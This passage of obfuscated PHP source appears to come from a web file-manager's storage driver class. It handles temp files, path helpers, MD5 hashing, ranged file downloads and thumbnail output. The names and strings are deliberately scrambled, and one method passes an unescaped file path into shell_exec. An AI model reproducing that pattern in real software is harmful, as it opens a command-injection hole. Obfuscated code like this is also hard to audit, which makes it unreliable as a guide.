$€¸÷ò•ñ = TEMP_FILES . rand_string(15) . $_SERVER[ĞÆÏ¡Îª][8]; @mkdir($€¸÷ò•ñ, DEFAULT_PERRMISSIONS, !0); $Ú†ß€Ù¢ = $€¸÷ò•ñ . $Ø¥¥ïáµ; @touch($Ú†ß€Ù¢); if ($–Óö³­) { file_put_contents($Ú†ß€Ù¢, $–Óö³­); } return $Ú†ß€Ù¢; } public function tempFileRemve($ÊÕ‘ŞëÛ) { @unlink($ÊÕ‘ŞëÛ); @rmdir($this->pathFather($ÊÕ‘ŞëÛ)); } public function mkfile($ûÀö‘™’, $ıÂÛ®ã¼ = '', $Ğ²Ï“®¦ = REPEAT_RENAME) { } public function mkdir($Á“ğ¥«…, $©—ÉéÒ´ = REPEAT_SKIP) { } public function delFile($¿ÓĞÆù) { } public function delFolder($…Ä‡êï²) { } public function copyFile($Ã„†éê, $ŒÖîîŠ¦) { } public function moveFile($ºÚÃå’î, $´›é„Ê³) { } public function remove($Ë‹£Ç²©) { if ($this->isFile($Ë‹£Ç²©)) { return $this->delFile($Ë‹£Ç²©); } return $this->delFolder($Ë‹£Ç²©); } public function rename($†¼Ï©Éê, $ÙÌ×â›) { } public function exist($×´Óä­) { } public function findByHash($ßıëúÙ× = '', $ÏÅâÔÀ = '') { return !1; } public function isFile($Ê€«Ş‘Ö) { } public function isFolder($©Ï”Í½•) { } public function size($ßı•ÌÉ¨) { } public function info($şª®¾¾¢) { } public function infoSimple($¼Áî©‰) { return $this->info($¼Áî©‰); } public function infoAuth($Ù¬İü•ò) { return $this->info($Ù¬İü•ò); } public function infoFull($úŒĞ£ğü) { return $this->info($úŒĞ£ğü); } public function infoWithChildren($¶Ò§’ïÅ) { $Ú©î„ =& $_SERVER[ĞÆÏ¡Îª]; static $Ş„´¸É— = array(); if (isset($Ş„´¸É—[$¶Ò§’ïÅ])) { return $Ş„´¸É—[$¶Ò§’ïÅ]; } $—İ·ĞÑü = $this->info($¶Ò§’ïÅ); if ($—İ·ĞÑü && $—İ·ĞÑü[$Ú©î„[33]] == $Ú©î„[75]) { $ëë“Í« = array($Ú©î„[76] => 0, $Ú©î„[77] => 0, $Ú©î„[78] => 0); $this->infoChildren($¶Ò§’ïÅ, $ëë“Í«); $—İ·ĞÑü[$Ú©î„[76]] = $ëë“Í«[$Ú©î„[76]]; $—İ·ĞÑü[$Ú©î„[79]] = array($Ú©î„[80] => $ëë“Í«[$Ú©î„[77]], $Ú©î„[81] => $ëë“Í«[$Ú©î„[78]]); $Ş„´¸É—[$¶Ò§’ïÅ] = $—İ·ĞÑü; } return $—İ·ĞÑü; } public function listPath($¾ôÔ‰ÍŒ, $ßÊà‰ĞÉ = false) { } public function has($‚ñáĞ”Ô, $ñÁÍŸé© = false, $ú»‹¯ï‰ = false) { } public function canRead($¤®²¥®•) { } public function canWrite($Àú•ÆÒø) { } public function getContent($‚‹áåö•) { } public function setContent($ˆñë¦, $ç¤†ŸŞ = '') { } protected function infoChildren($Òâ´û€ç, &$ü¿Î‹ª) { $¸°¶”Îá =& $_SERVER[ĞÆÏ¡Îª]; check_abort_echo(); $°ø–Œºü = $this->listPath($Òâ´û€ç, !0); $°ø–Œºü = array_merge($°ø–Œºü[$¸°¶”Îá[82]], $°ø–Œºü[$¸°¶”Îá[83]]); foreach ($°ø–Œºü as $È‡Ôİâµ) { if ($È‡Ôİâµ[$¸°¶”Îá[33]] == $¸°¶”Îá[75]) { $ü¿Î‹ª[$¸°¶”Îá[78]]++; $›µÂ³Î = $this->getPathInner($È‡Ôİâµ[$¸°¶”Îá[84]]); $this->infoChildren($›µÂ³Î, $ü¿Î‹ª); } else { $ü¿Î‹ª[$¸°¶”Îá[77]]++; $ü¿Î‹ª[$¸°¶”Îá[76]] += $È‡Ôİâµ[$¸°¶”Îá[76]]; } } } public function fileSubstr($íéù¥§ï, $ÙˆÅò™÷, $Ôâşã›) { } public function listAll($à•¦£ë¸) { } public function listAllMake($ÁÇâÉöê, &$Ã”¹¬) { $ÙÖšÊÜÛ =& $_SERVER[ĞÆÏ¡Îª]; check_abort_echo(); $œçö§§ = $this->listPath($ÁÇâÉöê, !0); if (!$œçö§§) { return; } $ÁšùæË€ = array_merge($œçö§§[$ÙÖšÊÜÛ[82]], $œçö§§[$ÙÖšÊÜÛ[83]]); foreach ($ÁšùæË€ as $ıæÂ£ûõ) { $Å¬Óû‹€ = $ıæÂ£ûõ[$ÙÖšÊÜÛ[33]] == $ÙÖšÊÜÛ[75]; $Ä¡€û©» = array($ÙÖšÊÜÛ[84] => $ıæÂ£ûõ[$ÙÖšÊÜÛ[84]], $ÙÖšÊÜÛ[75] => $Å¬Óû‹€); if (isset($ıæÂ£ûõ[$ÙÖšÊÜÛ[76]])) { $Ä¡€û©»[$ÙÖšÊÜÛ[76]] = $ıæÂ£ûõ[$ÙÖšÊÜÛ[76]]; } if (isset($ıæÂ£ûõ[$ÙÖšÊÜÛ[85]])) { $Ä¡€û©»[$ÙÖšÊÜÛ[85]] = $ıæÂ£ûõ[$ÙÖšÊÜÛ[85]]; } if (!$Å¬Óû‹€) { $Ã”¹¬[] = $Ä¡€û©»; continue; } $Ã”¹¬[] = $Ä¡€û©»; $¹‰½ÏØÀ = $ıæÂ£ûõ[$ÙÖšÊÜÛ[84]]; $”èíûß¿ = $this->pathDriver; if (substr($ıæÂ£ûõ[$ÙÖšÊÜÛ[84]], 0, strlen($”èíûß¿)) == $”èíûß¿) { $¹‰½ÏØÀ = substr($¹‰½ÏØÀ, strlen($”èíûß¿)); } $this->listAllMake($¹‰½ÏØÀ, $Ã”¹¬); } } public function listAllSimple($ÅŸÁÏöü) { $“À»ÜØê =& $_SERVER[ĞÆÏ¡Îª]; $ßğ»ó«´ = array(); $¿ùÏËİê = $this->listAll($ÅŸÁÏöü); $ÚÃñƒ…µ = $this->getPathOuter($ÅŸÁÏöü); foreach ($¿ùÏËİê as $„¯ú‘åî) { $Ãí¬¢Ò¡ = $„¯ú‘åî[$“À»ÜØê[84]]; $Üª“î¯È = $„¯ú‘åî[$“À»ÜØê[84]]; if (isset($„¯ú‘åî[$“À»ÜØê[86]])) { $Ãí¬¢Ò¡ = $„¯ú‘åî[$“À»ÜØê[86]][$“À»ÜØê[84]]; $„¯ú‘åî[$“À»ÜØê[76]] = $„¯ú‘åî[$“À»ÜØê[86]][$“À»ÜØê[76]]; $„¯ú‘åî[$“À»ÜØê[85]] = $„¯ú‘åî[$“À»ÜØê[86]][$“À»ÜØê[85]]; } else { $Üª“î¯È = substr($„¯ú‘åî[$“À»ÜØê[84]], strlen(get_path_father($ÚÃñƒ…µ))); $Üª“î¯È = $“À»ÜØê[8] . ltrim($Üª“î¯È, $“À»ÜØê[8]); } $…ÕË¬’ = array($“À»ÜØê[84] => $Üª“î¯È, $“À»ÜØê[75] => $„¯ú‘åî[$“À»ÜØê[75]]); if (isset($„¯ú‘åî[$“À»ÜØê[76]]) && !$„¯ú‘åî[$“À»ÜØê[75]]) { $…ÕË¬’[$“À»ÜØê[76]] = $„¯ú‘åî[$“À»ÜØê[76]]; } if (isset($„¯ú‘åî[$“À»ÜØê[85]])) { $…ÕË¬’[$“À»ÜØê[85]] = $„¯ú‘åî[$“À»ÜØê[85]]; } if (!$„¯ú‘åî[$“À»ÜØê[75]]) { $…ÕË¬’[$“À»ÜØê[87]] = $Ãí¬¢Ò¡; } $ßğ»ó«´[] = $…ÕË¬’; } return $ßğ»ó«´; } public function upload($Ğòò—‹, $ûÑ¾ùæ¨, $“•†é‚ç = false, $•’é¨Š¬ = REPEAT_REPLACE) { } public function uploadFileByID($â®ãæ£É, $óëàş’Á, $Ïë–ãšš) { } public function uploadFileByPath($§óÊê–„, $ÎÇÀºèÄ, $Òû¶Ï = array()) { } public function isUploadServer() { $™¼¼Õø =& $_SERVER[ĞÆÏ¡Îª]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $™¼¼Õø[88]) { return !0; } return $GLOBALS[$™¼¼Õø[6]][$™¼¼Õø[89]][$™¼¼Õø[90]]; } public function isFileOutServer() { $÷Ğ Æ³å =& $_SERVER[ĞÆÏ¡Îª]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $÷Ğ Æ³å[88]) { return !0; } return $GLOBALS[$÷Ğ Æ³å[6]][$÷Ğ Æ³å[89]][$÷Ğ Æ³å[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ü¶ë¾Ò…) { $—»ÛÁÄû =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->isCdnHost()) { return $Ü¶ë¾Ò…; } return str_replace(trim(get_url_root($Ü¶ë¾Ò…), $—»ÛÁÄû[8]), trim($this->cdnHost, $—»ÛÁÄû[8]), $Ü¶ë¾Ò…); } public function uploadLink($Ú‡™²¨›, $®µ°”—Â = 0) { $´Ñ‚îÀÊ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->isUploadServer()) { return; } $×Š¼È¸û = $this->getType(); if (!in_array($×Š¼È¸û, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÅÍõ€Ğ— = 1024 * 1024 * 10; $„×ùü  = $®µ°”—Â <= $ÅÍõ€Ğ— ? $´Ñ‚îÀÊ[92] : $´Ñ‚îÀÊ[93]; $°½şÃÍ = (!$®µ°”—Â ? 1 : ceil($®µ°”—Â / pow(1024, 3))) * 3600 * 4; $ÑôÕÈ“ç = $this->{$„×ùü }($Ú‡™²¨›, $°½şÃÍ); if ($ÑôÕÈ“ç) { $ÑôÕÈ“ç[$´Ñ‚îÀÊ[94]] = $Ú‡™²¨›; $ÑôÕÈ“ç[$´Ñ‚îÀÊ[95]] = $×Š¼È¸û; } return $ÑôÕÈ“ç; } public function uploadFormData($ğÖªÈÔ¿, $ÔæÃ»İ„ = 3600) { } public function multiUploadFormData($•‘Ï½§, $˜„–ü¾Ö = 3600) { } public function download($ßĞñ²ÄÜ, $ ¯ˆŒÇí) { } public function ext($¥é¸­¼˜) { $ßŠ§ÁÚù =& $_SERVER[ĞÆÏ¡Îª]; if (strpos($¥é¸­¼˜, $ßŠ§ÁÚù[8]) === -1) { $¹ĞÎö¦ = $¥é¸­¼˜; } else { $¹ĞÎö¦ = $this->pathThis($¥é¸­¼˜); } $ÉâÑÛå» = $ßŠ§ÁÚù[12]; if (strstr($¹ĞÎö¦, $ßŠ§ÁÚù[10])) { $ÉâÑÛå» = substr($¹ĞÎö¦, strrpos($¹ĞÎö¦, $ßŠ§ÁÚù[10]) + 1); $ÉâÑÛå» = strtolower($ÉâÑÛå»); } if (strlen($ÉâÑÛå») > 3 && preg_match($ßŠ§ÁÚù[96], $ÉâÑÛå», $£Î²¥×Æ)) { $ÉâÑÛå» = $ßŠ§ÁÚù[12]; } return $ÉâÑÛå»; } public function pathThis($¢Šî¥àö) { $÷îÎìÆé =& $_SERVER[ĞÆÏ¡Îª]; $¢Šî¥àö = str_replace($÷îÎìÆé[97], $÷îÎìÆé[8], rtrim($¢Šî¥àö, $÷îÎìÆé[8])); $¿Ó¾“Ñ’ = strrpos($¢Šî¥àö, $÷îÎìÆé[8]); if ($¿Ó¾“Ñ’ === !1) { return $¢Šî¥àö; } return substr($¢Šî¥àö, $¿Ó¾“Ñ’ + 1); } public function pathFather($ß·äÆ¼–) { $£—’ÍÍô =& $_SERVER[ĞÆÏ¡Îª]; $ß·äÆ¼– = str_replace($£—’ÍÍô[97], $£—’ÍÍô[8], rtrim($ß·äÆ¼–, $£—’ÍÍô[8])); $ş¬¸Ùç¦ = strrpos($ß·äÆ¼–, $£—’ÍÍô[8]); if ($ş¬¸Ùç¦ === !1) { return $£—’ÍÍô[12]; } return substr($ß·äÆ¼–, 0, $ş¬¸Ùç¦ + 1); } public function hashSimple($åï‚Ó) { $¼ğ²ıì“ =& $_SERVER[ĞÆÏ¡Îª]; if (!$åï‚Ó) { return md5($¼ğ²ıì“[12]); } $Ÿºı«İ´ = $this->size($åï‚Ó); $Ï÷‡¦â¢ = 200; $ ÇÜ²Ô = 50; if ($Ÿºı«İ´ <= $Ï÷‡¦â¢ * $ ÇÜ²Ô) { return $this->hashMd5($åï‚Ó) . $Ÿºı«İ´; } $§¼½•¬ú = intval($Ÿºı«İ´ / $ ÇÜ²Ô); $ô÷‚¤ƒŞ = $¼ğ²ıì“[12]; for ($¦Ñ™®öã = 0; $¦Ñ™®öã < $ ÇÜ²Ô; $¦Ñ™®öã++) { $ô÷‚¤ƒŞ .= $this->fileSubstr($åï‚Ó, $§¼½•¬ú * $¦Ñ™®öã, $Ï÷‡¦â¢); } $ô÷‚¤ƒŞ .= $this->fileSubstr($åï‚Ó, $Ÿºı«İ´ - $Ï÷‡¦â¢, $Ï÷‡¦â¢); return md5($ô÷‚¤ƒŞ) . $Ÿºı«İ´; } public static $md5Cache = array(); public function hashMd5($¼è¿ÒÜ) { if (!$¼è¿ÒÜ) { return md5($_SERVER[ĞÆÏ¡Îª][12]); } $¼è¿ÒÜ = $this->iconvSystem($¼è¿ÒÜ); if (isset(self::$md5Cache[$¼è¿ÒÜ])) { return self::$md5Cache[$¼è¿ÒÜ]; } self::$md5Cache[$¼è¿ÒÜ] = $this->hashMd5Shell($¼è¿ÒÜ); if (!self::$md5Cache[$¼è¿ÒÜ]) { self::$md5Cache[$¼è¿ÒÜ] = @md5_file($¼è¿ÒÜ); } return self::$md5Cache[$¼è¿ÒÜ]; } private function hashMd5Shell($“ÏÄØµü) { $Õ®úá¥É =& $_SERVER[ĞÆÏ¡Îª]; if (!$“ÏÄØµü) { return md5($Õ®úá¥É[12]); } if (!function_exists($Õ®úá¥É[98])) { return !1; } $—˜ÅµÂô = array($Õ®úá¥É[99], $Õ®úá¥É[100]); $ÒâÏ˜ù = Cache::get($Õ®úá¥É[101]); if (!$ÒâÏ˜ù) { $šãœùœê = BASIC_PATH . $Õ®úá¥É[102]; $ŒœĞÉ³» = md5_file($šãœùœê); $ÒâÏ˜ù = $Õ®úá¥É[103]; foreach ($—˜ÅµÂô as $¨ñ¥‰Üı) { $ß½›Ğ¸’ = shell_exec($¨ñ¥‰Üı . "\40\42{$šãœùœê}\42"); if ($ß½›Ğ¸’ && substr(trim($ß½›Ğ¸’), 0, 32) == $ŒœĞÉ³») { $ÒâÏ˜ù = $¨ñ¥‰Üı; break; } } Cache::set($Õ®úá¥É[101], $ÒâÏ˜ù, 3600); } if ($ÒâÏ˜ù == $Õ®úá¥É[103]) { return !1; } $ß½›Ğ¸’ = shell_exec($ÒâÏ˜ù . "\x20\42{$“ÏÄØµü}\42"); $ß½›Ğ¸’ = str_replace($Õ®úá¥É[104], $Õ®úá¥É[12], $ß½›Ğ¸’); return substr($ß½›Ğ¸’, 0, 32); } public function link($àÖªÊ’®) { return $àÖªÊ’®; } public function fileOut($ø·´Ñ‡, $‚©¡êö£ = false, $“ÕìœÆ = false, $ÖÓºèµ² = '') { $öÛå”’¾ =& $_SERVER[ĞÆÏ¡Îª]; $this->cacheMethod(null, null); if (!$ø·´Ñ‡ || !$this->exist($ø·´Ñ‡)) { show_json(LNG($öÛå”’¾[105]), !1, $“ÕìœÆ); } $Ùé¨ÓÔÊ = $this->getType() == $öÛå”’¾[106]; $®±óíÇ» = $GLOBALS[$öÛå”’¾[6]][$öÛå”’¾[89]][$öÛå”’¾[107]][$öÛå”’¾[108]]; $§æõ©®¦ = (double) $GLOBALS[$öÛå”’¾[6]][$öÛå”’¾[89]][$öÛå”’¾[107]][$öÛå”’¾[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¨ÍÖŞ¿ = $this->infoFull($ø·´Ñ‡); $ĞÉ“¦œâ = $¨ÍÖŞ¿[$öÛå”’¾[76]]; $¥µµõˆÕ = gmdate($öÛå”’¾[110], $¨ÍÖŞ¿[$öÛå”’¾[85]]); $É×ˆ¨÷å = $“ÕìœÆ ? $“ÕìœÆ : $this->iconvApp($¨ÍÖŞ¿[$öÛå”’¾[32]]); $ÈıÒò¢• = 0; $Ù«Š‚² = $ĞÉ“¦œâ - 1; $ŠƒÌ²Èã = $this->ext($É×ˆ¨÷å); if (in_array($ŠƒÌ²Èã, array($öÛå”’¾[111], $öÛå”’¾[112], $öÛå”’¾[113], $öÛå”’¾[114]))) { $ŠƒÌ²Èã = $öÛå”’¾[115]; } if (in_array($ŠƒÌ²Èã, array($öÛå”’¾[116]))) { $ŠƒÌ²Èã = $öÛå”’¾[117]; } if (!$ÖÓºèµ²) { $ÖÓºèµ² = md5($¥µµõˆÕ . $this->hashSimple($ø·´Ñ‡)); } $ÖÓºèµ² = $öÛå”’¾[118] . $ÖÓºèµ² . $öÛå”’¾[118]; $ÅÏÂ’û = get_file_mime($ŠƒÌ²Èã); $×†«Ğ° = !0; $×†«Ğ° = isset($_GET[$öÛå”’¾[119]]) ? !1 : !0; if ($‚©¡êö£ === !1 && !mime_support($ÅÏÂ’û)) { $ÅÏÂ’û = $öÛå”’¾[120]; } header($öÛå”’¾[121]); header($öÛå”’¾[122] . $ÅÏÂ’û); $¤‹£×ø = rawurlencode($É×ˆ¨÷å); $¤‹£×ø = $öÛå”’¾[118] . $¤‹£×ø . $öÛå”’¾[123] . $¤‹£×ø; if ($‚©¡êö£) { header($öÛå”’¾[124]); header($öÛå”’¾[125] . $¤‹£×ø); } else { if ($×†«Ğ°) { header($öÛå”’¾[126] . $¤‹£×ø); } } header($öÛå”’¾[127] . gmdate($öÛå”’¾[110], time() + 3600 * 24 * 30) . $öÛå”’¾[128]); header($öÛå”’¾[129]); header($öÛå”’¾[130]); header($öÛå”’¾[131]); if (isset($_SERVER[$öÛå”’¾[132]]) && strtotime($_SERVER[$öÛå”’¾[132]]) == $¨ÍÖŞ¿[$öÛå”’¾[85]]) { header($öÛå”’¾[133], !0, 304); die; } if (isset($_SERVER[$öÛå”’¾[134]]) && $_SERVER[$öÛå”’¾[134]] == $ÖÓºèµ²) { header($öÛå”’¾[135] . $ÖÓºèµ², !0, 304); die; } header($öÛå”’¾[135] . $ÖÓºèµ²); header($öÛå”’¾[136] . $¥µµõˆÕ . $öÛå”’¾[128]); header($öÛå”’¾[137] . $É×ˆ¨÷å); header($öÛå”’¾[138]); header($öÛå”’¾[139] . $ĞÉ“¦œâ); header($öÛå”’¾[140]); if (!$‚©¡êö£ && $ŠƒÌ²Èã == $öÛå”’¾[141]) { if ($ĞÉ“¦œâ > 1024 * 1024 * 5) { die; } $ô¡ç¹œ× = $this->getContent($ø·´Ñ‡); $ô¡ç¹œ× = Html::clearSVG($ô¡ç¹œ×); header($öÛå”’¾[142] . strlen($ô¡ç¹œ×)); echo $ô¡ç¹œ×; die; } $…îœŸÈ  = strtolower($_SERVER[$öÛå”’¾[143]]); if ($Ùé¨ÓÔÊ && $…îœŸÈ  && $®±óíÇ») { if (strstr($…îœŸÈ , $öÛå”’¾[144])) { header($öÛå”’¾[145] . $ø·´Ñ‡); } else { if (strstr($…îœŸÈ , $öÛå”’¾[146])) { header($öÛå”’¾[147] . $ø·´Ñ‡); } else { if (strstr($…îœŸÈ , $öÛå”’¾[148])) { header($öÛå”’¾[149] . $ø·´Ñ‡); } } } if ($§æõ©®¦) { header($öÛå”’¾[150] . $§æõ©®¦); } return; } if (isset($_SERVER[$öÛå”’¾[151]])) { if (preg_match($öÛå”’¾[152], $_SERVER[$öÛå”’¾[151]], $¬ ìİ§Æ)) { $ÈıÒò¢• = intval($¬ ìİ§Æ[1]); if (!empty($¬ ìİ§Æ[2])) { $Ù«Š‚² = intval($¬ ìİ§Æ[2]); } } header($öÛå”’¾[153]); header("\103\157\156\x74\145\x6e\x74\55\x52\x61\156\147\145\x3a\x20\x62\171\x74\145\x73\x20{$ÈıÒò¢•}\x2d{$Ù«Š‚²}\57" . $ĞÉ“¦œâ); } else { header($öÛå”’¾[154]); } header($öÛå”’¾[155]); $¹Üª³Æ  = !0; if ($_SERVER[$öÛå”’¾[156]] == $öÛå”’¾[157] && $ĞÉ“¦œâ > 1204 * 1024 * 1024 * 2) { $¹Üª³Æ  = !1; } if ($¹Üª³Æ ) { header($öÛå”’¾[158] . ($Ù«Š‚² - $ÈıÒò¢• + 1)); } if ($_SERVER[$öÛå”’¾[159]] == $öÛå”’¾[160]) { return; } $ĞÜõÑ¿ = 1024 * 100; $ûÒ¬Á÷§ = 0; if ($§æõ©®¦) { $ûÒ¬Á÷§ = intval(1000 * 1000 * ($ĞÜõÑ¿ / $§æõ©®¦)); } while ($ÈıÒò¢• <= $Ù«Š‚²) { $ø‹îÒ»á = timeFloat(); check_abort(); $ç”â†åÁ = $Ù«Š‚² - $ÈıÒò¢• + 1; if ($ç”â†åÁ <= $ĞÜõÑ¿) { $ĞÜõÑ¿ = $ç”â†åÁ; } echo $this->fileSubstr($ø·´Ñ‡, $ÈıÒò¢•, $ĞÜõÑ¿); $ÈıÒò¢• += $ĞÜõÑ¿; if ($ĞÜõÑ¿ == $ç”â†åÁ) { $ÈıÒò¢• = $Ù«Š‚² + 1; } if ($ûÒ¬Á÷§) { $ÃÛÎÃİ³ = intval(1000 * 1000 * (timeFloat() - $ø‹îÒ»á)); $ï÷„†ªí = $ûÒ¬Á÷§ - $ÃÛÎÃİ³; if ($ï÷„†ªí > 5) { usleep($ï÷„†ªí); } } } } public function fileOutServer($•ºè×àÅ, $¼çëÅ¢¤ = false, $Ñ¾”³Èï = false, $ô à€¦ = '') { $this->fileOut($•ºè×àÅ, $¼çëÅ¢¤, $Ñ¾”³Èï, $ô à€¦); } public function fileOutLink($Ú½„Ü’Õ) { header($_SERVER[ĞÆÏ¡Îª][161] . $Ú½„Ü’Õ); die; } public function cacheMethod($ò¢Ô¹¡ï, $½¬‘ÍêÉ, $ÈªÎûÁÊ = null) { $¦ñğƒõÍ =& $_SERVER[ĞÆÏ¡Îª]; static $Äèì«ü­ = array(); $¤š»İ£° = $½¬‘ÍêÉ ? ltrim($this->getPathOuter($½¬‘ÍêÉ), $¦ñğƒõÍ[8]) : $¦ñğƒõÍ[12]; $â¬˜ƒ = $¦ñğƒõÍ[162] . $ò¢Ô¹¡ï . $¦ñğƒõÍ[163] . rtrim($¤š»İ£°, $¦ñğƒõÍ[8]); if (is_null($ò¢Ô¹¡ï)) { $Äèì«ü­ = array(); return; } if (is_null($½¬‘ÍêÉ)) { foreach ($Äèì«ü­ as $â¬˜ƒ => $ÜöÉöøá) { if (!strstr($â¬˜ƒ, $¦ñğƒõÍ[162] . $ò¢Ô¹¡ï . $¦ñğƒõÍ[164])) { continue; } unset($Äèì«ü­[$â¬˜ƒ]); } return; } if (!is_null($ÈªÎûÁÊ)) { $Äèì«ü­[$â¬˜ƒ] = $ÈªÎûÁÊ; return; } $î°ÂØ´ = isset($Äèì«ü­[$â¬˜ƒ]) ? $Äèì«ü­[$â¬˜ƒ] : null; if (!is_null($î°ÂØ´)) { return $î°ÂØ´; } $î°ÂØ´ = $this->{$ò¢Ô¹¡ï}($½¬‘ÍêÉ); $Äèì«ü­[$â¬˜ƒ] = $î°ÂØ´; return $î°ÂØ´; } public function cacheMethodInfoSet($òï—Çöì, $ËİâÛ’, $ËìÑÍ¶ = false) { $«ø±´÷Ü =& $_SERVER[ĞÆÏ¡Îª]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($«ø±´÷Ü[165], $òï—Çöì, $ËİâÛ’); $this->cacheMethod($«ø±´÷Ü[166], $òï—Çöì, $ËİâÛ’ ? !1 : !0); if (is_array($ËìÑÍ¶)) { $this->cacheMethod($«ø±´÷Ü[167], $òï—Çöì, $ËìÑÍ¶); } } public function fileOutImage($‚¥²Ô, $¼…ÛÈë = 250) { $‰ÉÔ°´ =& $_SERVER[ĞÆÏ¡Îª]; set_timeout(); if (substr($‚¥²Ô, 0, 4) == $‰ÉÔ°´[148]) { $this->fileOutLink($‚¥²Ô); } $Ü“ˆÀİ = $this->info($‚¥²Ô); $–Ãí‹©Ò = $Ü“ˆÀİ[$‰ÉÔ°´[32]]; $ğ²¯Éìİ = !1; if (isset($GLOBALS[$‰ÉÔ°´[168]]) && $GLOBALS[$‰ÉÔ°´[168]][$‰ÉÔ°´[84]] == $Ü“ˆÀİ[$‰ÉÔ°´[84]]) { $Úü’¡¿¡ = $GLOBALS[$‰ÉÔ°´[168]][$‰ÉÔ°´[169]]; if (!$Ü“ˆÀİ[$‰ÉÔ°´[170]]) { $Ü“ˆÀİ[$‰ÉÔ°´[170]] = $GLOBALS[$‰ÉÔ°´[168]]; } if (isset($Úü’¡¿¡[$‰ÉÔ°´[171]])) { if ($Úü’¡¿¡[$‰ÉÔ°´[171]] <= $¼…ÛÈë && $Úü’¡¿¡[$‰ÉÔ°´[172]] <= $¼…ÛÈë) { $ğ²¯Éìİ = !0; } } $–Ãí‹©Ò = $Ü“ˆÀİ[$‰ÉÔ°´[170]][$‰ÉÔ°´[32]]; } if ($Ü“ˆÀİ[$‰ÉÔ°´[76]] <= 1024 * 50 || $ğ²¯Éìİ || !function_exists($‰ÉÔ°´[173]) || $Ü“ˆÀİ[$‰ÉÔ°´[174]] == $‰ÉÔ°´[175]) { return $this->fileOut($‚¥²Ô, !1, $–Ãí‹©Ò); } if (isset($Ü“ˆÀİ[$‰ÉÔ°´[170]][$‰ÉÔ°´[176]])) { $ÏÈÎ“Àş = $Ü“ˆÀİ[$‰ÉÔ°´[170]][$‰ÉÔ°´[176]]; } else { if (isset($Ü“ˆÀİ[$‰ÉÔ°´[170]][$‰ÉÔ°´[177]])) { $ÏÈÎ“Àş = $Ü“ˆÀİ[$‰ÉÔ°´[170]][$‰ÉÔ°´[177]]; } } if (!$ÏÈÎ“Àş) { $ÏÈÎ“Àş = md5("{$Ü“ˆÀİ[$‰ÉÔ°´[32]]}\137{$Ü“ˆÀİ[$‰ÉÔ°´[84]]}\137{$Ü“ˆÀİ[$‰ÉÔ°´[76]]}\137{$¼…ÛÈë}"); } $§”–˜ = "{$ÏÈÎ“Àş}\x5f{$¼…ÛÈë}\56\160\x6e\x67"; if (!($¯ÍÙİö = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $‰ÉÔ°´[178]))) { $”Ùãˆáá = IO::mkdir(IO_PATH_SYSTEM_TEMP . $‰ÉÔ°´[179]); } else { $”Ùãˆáá = KodIO::make($¯ÍÙİö); } if ($¯ÍÙİö = IO::fileNameExist($”Ùãˆáá, $§”–˜)) { $†ÚäÍ‚ = KodIO::make($¯ÍÙİö); return IO::fileOut($†ÚäÍ‚, !1, $–Ãí‹©Ò); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $†ÚäÍ‚ = DATA_THUMB . $§”–˜; del_file($†ÚäÍ‚); if (!@file_exists($†ÚäÍ‚)) { $Á´Ø÷÷ = TEMP_FILES; if (!is_dir($Á´Ø÷÷)) { mk_dir($Á´Ø÷÷); } $†“ÄüÊ¨ = $Á´Ø÷÷ . $ÏÈÎ“Àş . $‰ÉÔ°´[10] . $Ü“ˆÀİ[$‰ÉÔ°´[174]]; if (!@file_exists($†“ÄüÊ¨)) { $†“ÄüÊ¨ = $this->download($‚¥²Ô, $†“ÄüÊ¨); } ImageThumb::createThumb($†“ÄüÊ¨, $†ÚäÍ‚, $¼…ÛÈë, $¼…ÛÈë * 10); } if (!file_exists($†ÚäÍ‚) || filesize($†ÚäÍ‚) < 100) { return @file_exists($†“ÄüÊ¨) ? IO::fileOut($†“ÄüÊ¨) : $this->fileOut($‚¥²Ô); } if (!($Ã·ëàã« = IO::move($†ÚäÍ‚, $”Ùãˆáá))) { return IO::fileOut($†ÚäÍ‚); } del_file($†ÚäÍ‚); IO::fileOut($Ã·ëàã«); } public function fileOutImageServer($«´îÈ«, $ÀÆµ•§Ì = 250) { $this->fileOutImage($«´îÈ«, $ÀÆµ•§Ì); } public function fileNameAuto($’›‰ÕÙñ, $«¨ŞšÎÈ, $åÁğ°³€ = REPEAT_RENAME, $ŒÌ…Ôá™ = false) { $¥ÑÁí¥Ó =& $_SERVER[ĞÆÏ¡Îª]; $È£¢ä‹æ = $’›‰ÕÙñ === $¥ÑÁí¥Ó[12] ? $«¨ŞšÎÈ : rtrim($’›‰ÕÙñ, $¥ÑÁí¥Ó[8]) . $¥ÑÁí¥Ó[8] . $«¨ŞšÎÈ; if ($åÁğ°³€ == REPEAT_REPLACE || !$this->exist($È£¢ä‹æ) || $ŒÌ…Ôá™ && $åÁğ°³€ != REPEAT_RENAME_FOLDER) { return $«¨ŞšÎÈ; } if ($åÁğ°³€ == REPEAT_SKIP) { return !1; } $ÓÄ—Ã = $¥ÑÁí¥Ó[10] . get_path_ext($«¨ŞšÎÈ); $ÓÄ—Ã = $ÓÄ—Ã == $¥ÑÁí¥Ó[10] || $ŒÌ…Ôá™ ? $¥ÑÁí¥Ó[12] : $ÓÄ—Ã; $¹¤áÄ©¾ = 1; $Ä¨üÚåß = substr($«¨ŞšÎÈ, 0, strlen($«¨ŞšÎÈ) - strlen($ÓÄ—Ã)); $Õ‡¶ø¡” = $Ä¨üÚåß . "\x28{$¹¤áÄ©¾}\x29{$ÓÄ—Ã}"; while ($this->exist(rtrim($’›‰ÕÙñ, $¥ÑÁí¥Ó[8]) . $¥ÑÁí¥Ó[8] . $Õ‡¶ø¡”)) { $Õ‡¶ø¡” = $Ä¨üÚåß . "\50{$¹¤áÄ©¾}\x29{$ÓÄ—Ã}"; $¹¤áÄ©¾++; } return $Õ‡¶ø¡”; } private function fileNameAutoList($‘èÜÅ¨À, $ÎÄÎ£™¦, $¥Á·õÖÎ = false) { $Ø—¤±î˜ =& $_SERVER[ĞÆÏ¡Îª]; $Ü¶ø¤‹Œ = $this->listPath($‘èÜÅ¨À, !0); $Ü¶ø¤‹Œ = array_merge($Ü¶ø¤‹Œ[$Ø—¤±î˜[82]], 